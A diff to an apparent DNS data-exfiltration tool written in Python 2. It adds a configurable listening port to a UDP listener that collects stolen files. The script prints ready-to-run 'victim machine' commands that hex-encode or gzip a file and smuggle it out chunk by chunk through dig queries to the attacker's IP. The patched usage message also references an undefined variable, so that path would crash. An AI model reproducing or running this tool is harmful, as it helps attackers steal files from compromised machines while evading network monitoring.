@@ -92,22 +92,35 @@ Stealthy file extraction via DNS requests
 if __name__ == '__main__':
 
 	z = False
-
 	try:
 		ip = sys.argv[1]
+		try:
+			port = sys.argv[2]
+			
+		except :
+			#port = 53
+			pass
+
 		if "-z" in sys.argv:
 			z = True
 	except:
 
 		banner()
-		print "Usage: python %s [listen_address] [-z (optional: unzip incoming data)]" % sys.argv[0]
+		print "Usage: python %s [listen_address] %s [port][-z (optional: unzip incoming data)]" % (sys.argv[0],port)
+		print "You must be root to use high priv ports, or you can use low privilege ports"
+		print "and do portfw from firewall"
+
 		exit(1)
+	try:
+		port
+	except NameError:
+		port = 53 
 
 	banner()
 	udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	udp.bind((ip,53))
+	udp.bind((ip,int(port)))
 
-	print "%s[+]%s DNS listening on '%s:53'" % (c["g"], c["e"], ip)
+	print "%s[+]%s DNS listening on '%s:%s'" % (c["g"], c["e"], ip,port)
 	print "%s[+]%s Now on the victim machine, use any of the following commands (or similar):" % (c["y"], c["e"])
 	print "\t%s[\x23]%s for b in $(xxd -p /path/to/file); do dig +short @%s $b.filename.com; done" % (c["r"], c["e"], ip )
 	print "\t%s[\x23]%s for b in $(gzip -c /path/to/file | xxd -p); do dig +short @%s $b.filename.com; done\n" % (c["r"], c["e"], ip)
